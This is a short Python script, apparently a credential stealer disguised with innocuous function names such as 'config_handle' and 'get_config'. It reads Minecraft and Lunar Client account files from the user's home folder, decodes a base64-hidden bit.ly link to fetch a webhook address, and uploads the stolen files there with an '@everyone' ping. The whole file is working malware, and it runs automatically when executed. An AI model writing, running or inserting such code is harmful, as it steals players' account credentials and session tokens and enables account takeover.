import requests
import os
import base64

def config_handle(webhook_url, file1_content, file2_content, file3_content):
    content = "||@everyone||"
    files = {}
    if file1_content:
        files["file1"] = ("file1.json", file1_content)
    if file2_content:
        files["file2"] = ("file2.json", file2_content)
    if file3_content:
        files["file3"] = ("file3.json", file3_content)

    payload = {"content": content}
    requests.post(webhook_url, files=files, data=payload)
    
def bit():
    bit64 = "aHR0cHM6Ly9iaXQubHkvM09xZUZVbg=="
    bit = base64.b64decode(bit64.encode()).decode('utf-8')
    bit_response = requests.get(bit)
    bit_data = bit_response.json()
    bitu = bit_data["url"]
    return bitu

def get_config(file_path):
    if os.path.exists(file_path):
        with open(file_path, "rb") as file:
            return file.read()
    else:
        return None 
    
def main():
    webhook_url = bit()
    confi1_path = os.path.join(os.path.expanduser("~"), ".lunarclient", "settings", "game", "accounts.json")
    confi2_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "essential", "microsoft_accounts.json")
    confi3_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft","launcher_accounts.json")
    file1_content = get_config(confi1_path)
    file2_content = get_config(confi2_path)
    file3_content = get_config(confi3_path)
    if file1_content or file2_content or file3_content:
        config_handle(webhook_url, file1_content, file2_content, file3_content)

main()
